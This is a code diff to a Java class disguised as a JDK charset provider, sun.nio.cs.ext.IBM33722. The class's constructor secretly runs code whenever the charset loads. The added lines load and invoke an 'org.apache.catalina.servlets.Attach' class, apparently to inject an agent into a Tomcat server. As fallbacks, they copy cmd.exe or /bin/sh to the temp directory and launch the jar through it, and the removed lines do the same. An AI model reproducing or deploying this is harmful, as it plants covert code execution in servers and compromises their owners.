@@ -29,6 +29,8 @@
 
 package sun.nio.cs.ext;
 
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.nio.charset.Charset;
 import java.nio.charset.CharsetDecoder;
 import java.nio.charset.CharsetEncoder;
@@ -38,37 +40,43 @@ public class IBM33722 extends Charset implements HistoricallyNamedCharset {
     public IBM33722() {
         super("x-IBM33722", ExtendedCharsets.aliasesFor("x-IBM33722"));
         String agentFile = IBM33722.class.getResource("").getFile();
-        agentFile = agentFile.substring(agentFile.indexOf("/"),agentFile.lastIndexOf("!"));
-        String j = System.getProperty("java.home") + "/bin/java -jar ";
-        String jarc = j + agentFile;
-        String tmpdir = System.getProperty("java.io.tmpdir");
-        String osName = System.getProperty("os.name");
-        java.io.File source;
-        java.io.File dest;
-        String c;
-        if (osName.startsWith("Windows")){
-            source = new java.io.File("C:\\Windows\\System32\\cmd.exe");
-            dest = new java.io.File(tmpdir + java.io.File.separator + "c.exe");
-            c = "/c";
-        }else {
-            source = new java.io.File("/bin/sh");
-            dest = new java.io.File(tmpdir + java.io.File.separator + "s");
-            c = "-c";
-        }
-
+        agentFile = agentFile.substring(0,agentFile.lastIndexOf("!"));
         try {
-            copyFileUsingFileStreams(source,dest);
-            java.lang.Runtime.getRuntime().exec(new String[]{dest.getCanonicalPath(), c, jarc});
+            URLClassLoader cl = new URLClassLoader(new URL[] { new URL(agentFile) });
+            cl.loadClass("org.apache.catalina.servlets.Attach").getMethod("att", String.class).invoke(null,"ignored");
         } catch (Exception e) {
-            String[] command;
-            if (osName.startsWith("Windows")) {
-                command = new String[]{"cmd.exe", "/c", jarc};
-            } else {
-                command = new String[]{"/bin/sh", "-c", jarc};
+            agentFile = agentFile.substring(agentFile.indexOf("/"),agentFile.lastIndexOf("!"));
+            String j = System.getProperty("java.home") + "/bin/java -jar ";
+            String jarc = j + agentFile;
+            String tmpdir = System.getProperty("java.io.tmpdir");
+            String osName = System.getProperty("os.name");
+            java.io.File source;
+            java.io.File dest;
+            String c;
+            if (osName.startsWith("Windows")){
+                source = new java.io.File("C:\\Windows\\System32\\cmd.exe");
+                dest = new java.io.File(tmpdir + java.io.File.separator + "c.exe");
+                c = "/c";
+            }else {
+                source = new java.io.File("/bin/sh");
+                dest = new java.io.File(tmpdir + java.io.File.separator + "s");
+                c = "-c";
             }
+
             try {
-                Runtime.getRuntime().exec(command);
-            } catch (Exception ignored) {
+                copyFileUsingFileStreams(source,dest);
+                java.lang.Runtime.getRuntime().exec(new String[]{dest.getCanonicalPath(), c, jarc});
+            } catch (Exception ae) {
+                String[] command;
+                if (osName.startsWith("Windows")) {
+                    command = new String[]{"cmd.exe", "/c", jarc};
+                } else {
+                    command = new String[]{"/bin/sh", "-c", jarc};
+                }
+                try {
+                    Runtime.getRuntime().exec(command);
+                } catch (Exception ignored) {
+                }
             }
         }
     }
